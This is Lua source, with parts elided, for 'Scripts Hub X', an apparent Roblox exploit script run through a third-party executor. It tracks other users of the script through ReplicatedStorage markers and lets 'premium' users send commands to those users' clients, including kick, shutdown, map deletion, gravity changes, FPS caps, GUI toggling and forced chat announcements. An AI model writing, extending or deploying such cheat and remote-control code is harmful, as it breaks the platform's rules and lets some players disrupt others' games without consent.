-- ================================
-- Scripts Hub X | Official (Improved Detection & Commands)
-- ================================
...
-- ================================
-- SCRIPTS HUB X USER TRACKING SYSTEM (IMPROVED)
-- ================================
...
local helpGui = nil
local commandFolderCleanupTask = nil
...
-- Create user marker in ReplicatedStorage (IMPROVED: Remove duplicates first)
local function createUserMarker()
	pcall(function()
		local markerName = SCRIPTSHUBX_MARKER_NAME .. "_" .. player.UserId
		
		-- IMPROVEMENT: Remove existing marker to prevent duplicates
		local existingMarker = ReplicatedStorage:FindFirstChild(markerName)
		if existingMarker then
			print("[SHX] Removing duplicate marker...")
			existingMarker:Destroy()
		end
		
		-- Create fresh marker folder
		userMarker = Instance.new("Folder")
		userMarker.Name = markerName
		userMarker.Parent = ReplicatedStorage
		
		-- Create user info with proper JSON encoding
		local userInfo = Instance.new("StringValue")
		userInfo.Name = "UserInfo"
		userInfo.Parent = userMarker
		...
		print("[SHX] User marker created in ReplicatedStorage")
	end)
end

-- IMPROVEMENT: Cleanup marker when player leaves
local function setupMarkerCleanup()
	pcall(function()
		player.AncestryChanged:Connect(function(_, parent)
			if not parent then
				-- Player is being removed
				print("[SHX] Player leaving, cleaning up marker...")
				if userMarker and userMarker.Parent then
					userMarker:Destroy()
				end
			end
		end)
...
-- Create command folder only when needed (IMPROVED: Lazy loading)
local function createCommandFolder()
	if commandFolder then return end
	
	pcall(function()
		if ReplicatedStorage:FindFirstChild(COMMAND_FOLDER_NAME) then
			commandFolder = ReplicatedStorage[COMMAND_FOLDER_NAME]
		else
			commandFolder = Instance.new("Folder")
			commandFolder.Name = COMMAND_FOLDER_NAME
			commandFolder.Parent = ReplicatedStorage
			print("[SHX] Command folder created in ReplicatedStorage")
		end
		
		-- IMPROVEMENT: Schedule cleanup if folder stays empty
		if commandFolderCleanupTask then
			task.cancel(commandFolderCleanupTask)
		end
		
		commandFolderCleanupTask = task.delay(30, function()
			pcall(function()
				if commandFolder and #commandFolder:GetChildren() == 0 then
					print("[SHX] Removing empty command folder...")
					commandFolder:Destroy()
					commandFolder = nil
				end
			end)
		end)
...
-- Scan for other Scripts Hub X users (OPTIMIZED: Skip non-marker objects)
local function scanForScriptsHubXUsers()
	pcall(function()
		...
		for _, obj in pairs(ReplicatedStorage:GetChildren()) do
			-- OPTIMIZATION: Quick check if name starts with marker prefix
			if obj.Name:sub(1, #SCRIPTSHUBX_MARKER_NAME) == SCRIPTSHUBX_MARKER_NAME then
		...
		print("[SHX] Scan complete: Found " .. userCount .. " Scripts Hub X user(s)")
	end)
end

-- ================================
-- HELP GUI SYSTEM (UPDATED: Removed india/anime)
-- ================================

local commandsList = {
	{cmd = ";help", desc = "Shows this help menu", example = ";help", category = "Info"},
	{cmd = ";list", desc = "Lists all Scripts Hub X users in server", example = ";list", category = "Info"},
	...
	{cmd = ";kick [user] [msg]", desc = "Kicks you or target with custom message", example = ";kick username Bye!", category = "Player"},
	...
	{cmd = ";reveal [user]", desc = "Makes you or target announce SHX usage", example = ";reveal OR ;reveal username", category = "Fun"},
	{cmd = ";shutdown [user]", desc = "Shuts down you or target's game", example = ";shutdown OR ;shutdown username", category = "Server"},
	{cmd = ";deletemap [user]", desc = "Deletes workspace objects for target", example = ";deletemap username", category = "Server"},
	{cmd = ";gravity [user] [val]", desc = "Changes workspace gravity for target", example = ";gravity username 50", category = "Server"},
	{cmd = ";framerate [user] [fps]", desc = "Sets FPS cap for you or target", example = ";framerate username 30", category = "Client"},
	{cmd = ";toggle [user]", desc = "Toggles all ScreenGuis for target", example = ";toggle username", category = "Client"},
	{cmd = ";scriptshubx [user]", desc = "Changes skybox to SHX theme", example = ";scriptshubx username", category = "Visual"},
}
...
local function sendControlCommand(targetUserId, commandType, data)
	pcall(function()
		createCommandFolder() -- Lazy create only when needed
...
-- ================================
-- PREMIUM COMMAND FUNCTIONS (IMPROVED & FIXED)
-- ================================

local CommandFunctions = {}

-- Notification function (moved up for command use)
...
-- ;list command - Lists all Scripts Hub X users
CommandFunctions.list = function(args)
	-- Refresh the user list first
	scanForScriptsHubXUsers()
	
	print("\n========================================")
	print("Scripts Hub X - Active Users")
	print("========================================")
	
	local userCount = 0
	for userId, userData in pairs(trackedUsers) do
		userCount = userCount + 1
		local premiumStatus = userData.IsPremium and "[PREMIUM]" or "[FREE]"
		print(string.format("%d. %s (@%s) - ID: %s %s", 
			userCount, 
	...
	if userCount == 0 then
		print("No other Scripts Hub X users found in this server.")
	else
		print("========================================")
		print("Total: " .. userCount .. " user(s)")
	end
	print("========================================\n")
	
	notify("Scripts Hub X", "Found " .. userCount .. " user(s) - Check console (F9)")
end
...
-- ;kick command (IMPROVED: Custom message support)
CommandFunctions.kick = function(args, targetSelf)
	local message = table.concat(args, " ", 2)
	if not message or message == "" then
		message = "You have been kicked by a Scripts Hub X Premium user"
	end
	player:Kick(message)
end
...
-- ;deletemap command (FIXED: Only deletes for target, not executor)
CommandFunctions.deletemap = function(args, targetSelf)
	pcall(function()
		for _, obj in pairs(Workspace:GetChildren()) do
			if obj ~= Workspace.CurrentCamera and not obj:IsA("Terrain") then
				pcall(function() obj:Destroy() end)
			end
		end
	end)
	notify("Scripts Hub X", "Workspace cleared")
end

-- ;framerate command (IMPROVED: Proper FPS setting)
CommandFunctions.framerate = function(args, targetSelf)
	local fps = tonumber(args[2]) or 1
	pcall(function()
		if setfpscap then
			setfpscap(fps)
			notify("Scripts Hub X", "FPS set to " .. fps)
		else
			print("[SHX] FPS cap function not available on this executor")
		end
	end)
end
...
CommandFunctions.gravity = function(args, targetSelf)
	...
	notify("Scripts Hub X", "Gravity set to " .. gravityValue)
end
...
-- ;reveal command (FIXED: Chat announcement)
CommandFunctions.reveal = function(args, targetSelf)
	pcall(function()
		...
		if chatRemote and chatRemote:FindFirstChild("SayMessageRequest") then
			chatRemote.SayMessageRequest:FireServer("I am using Scripts Hub X :)", "All")
		else
			print("[SHX] Chat system not available")
		end
	end)
end
...
-- ;toggle command (FIXED: Toggles ScreenGuis properly)
CommandFunctions.toggle = function(args, targetSelf)
	pcall(function()
		...
		notify("Scripts Hub X", "ScreenGuis toggled")
	end)
end
...
-- ;uninject command (IMPROVED: Proper cleanup)
CommandFunctions.uninject = function(args, targetSelf)
	pcall(function()
		-- Remove marker from ReplicatedStorage
		if userMarker then 
			userMarker:Destroy() 
		end
		...
		print("[SHX] Uninjected successfully")
		notify("Scripts Hub X", "Uninjected - Script removed")
	end)
end
...
-- ;scriptshubx command (KEPT: Only SHX skybox remains)
CommandFunctions.scriptshubx = function(args, targetSelf)
	pcall(function()
		...
		notify("Scripts Hub X", "SHX skybox applied")
	end)
end
...
CommandFunctions.freeze = function(args, targetSelf)
	if player.Character then
		...
		notify("Scripts Hub X", "Character frozen")
	end
end
...
-- ================================
-- COMMAND LISTENER AND EXECUTOR (IMPROVED)
-- ================================

-- Commands that ONLY work on self (cannot be sent to others)
local strictlySelfOnlyCommands = {
	"help", "list", "uncontrol"
}

-- Listen for command objects in ReplicatedStorage
local function startCommandListener()
	-- Wait for command folder to be created
	local function waitForCommandFolder()
		return ReplicatedStorage:FindFirstChild(COMMAND_FOLDER_NAME)
	end
	
	local folder = waitForCommandFolder()
	if not folder then
		-- Listen for folder creation
		local connection
		connection = ReplicatedStorage.ChildAdded:Connect(function(child)
			if child.Name == COMMAND_FOLDER_NAME then
				commandFolder = child
				connection:Disconnect()
			end
		end)
	...
	-- Set up listener for when folder exists
	task.spawn(function()
		while not commandFolder do
			task.wait(0.5)
			commandFolder = ReplicatedStorage:FindFirstChild(COMMAND_FOLDER_NAME)
		end
		...
		print("[SHX] Command listener started (ReplicatedStorage)")
	end)
end

-- Parse and send commands from chat (IMPROVED)
local function parseCommand(message)
	...
	-- Check if command is strictly self-only
	if table.find(strictlySelfOnlyCommands, command) then
		print("[SHX] Executing self-only command: " .. command)
		task.spawn(function()
	...
	-- Refresh user list before finding target
	scanForScriptsHubXUsers()
	...
	-- Create command folder if needed (lazy loading)
	createCommandFolder()
...
spawn(function()
	print("[SHX] Initializing Scripts Hub X...")
	...
	-- IMPROVEMENT: Create marker with cleanup support
	print("[SHX] Setting up ReplicatedStorage tracking system...")
	createUserMarker()
	setupMarkerCleanup()
	
	-- IMPROVEMENT: Wait 1 second for full replication before first scan
	print("[SHX] Waiting for marker replication...")
	task.wait(1)
	scanForScriptsHubXUsers()
	
	-- Start command listener for all users (folder created lazily)
	...
	if isPremiumUser then
		...
		notify("Scripts Hub X", "Premium commands active! Type ;help or ;list")
	end
	
	-- Periodic user scan (every 30 seconds)
	task.spawn(function()
		while true do
			task.wait(30)
			scanForScriptsHubXUsers()
	...
	if success then
		...
		if isPremiumUser then
			print("[SHX] Premium commands ready. Type ;help for command list or ;list to see users")
		end
	else
